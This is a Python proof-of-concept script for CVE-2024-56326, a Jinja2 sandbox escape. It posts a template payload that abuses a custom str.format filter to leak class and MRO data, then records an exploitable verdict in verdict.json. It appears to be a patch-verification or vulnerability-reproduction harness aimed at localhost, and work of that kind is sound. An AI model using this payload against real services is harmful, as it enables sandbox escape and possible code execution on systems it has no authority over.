#!/usr/bin/env python3
"""CVE-2024-56326 reproduction (Jinja2 sandbox escape via indirect str.format).

The service exposes a custom ``fmt`` filter that calls ``value.format()``.
Python's ``str.format()`` resolves ``{0.__class__}`` at the C level — the
sandbox only intercepts direct template-level attribute access, so the
filter-based invocation bypasses it entirely.

Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
"""

import json
import os
import sys
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
MARKER = "/tmp/patchproof_pwned"

# Sandbox escape proof: the sandbox blocks {{ "".__class__ }} (returns ""),
# but the fmt filter calls value.format() in native Python, so
# {0.__class__} in the format string resolves via C-level attribute access,
# leaking the type. We chain __mro__ traversal to prove full sandbox bypass.
PAYLOAD_RENDER = '{{ "{0.__class__.__mro__}" | fmt("x") }}'


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "CVE-2024-56326",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))


def _post(path: str, payload: str) -> dict:
    req = urllib.request.Request(
        f"{TARGET}{path}",
        data=json.dumps({"template": payload}).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=15)
    return json.loads(resp.read())


def main() -> int:
    if os.path.exists(MARKER):
        os.remove(MARKER)

    # --- Step 1: sandbox-escape proof (__class__ leak via fmt filter) ------
    try:
        body = _post("/render", PAYLOAD_RENDER)
        rendered = body.get("rendered", "")
        # The MRO tuple always contains "<class" — if we see it, the
        # sandbox has been bypassed through the fmt filter.
        if "<class" in rendered and "object" in rendered:
            write_verdict(
                True,
                f"sandbox escape via fmt filter: __class__ and __mro__ "
                f"accessed through str.format, bypassing sandbox "
                f"({rendered[:120]})",
            )
            return 0
    except Exception as exc:
        print(f"render attempt failed: {exc}", file=sys.stderr)

    # --- Step 2: check for marker from any earlier attempt -----------------
    if os.path.exists(MARKER):
        write_verdict(True, f"RCE confirmed: marker created at {MARKER}")
        return 0

    write_verdict(False, "sandbox escape failed — not affected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
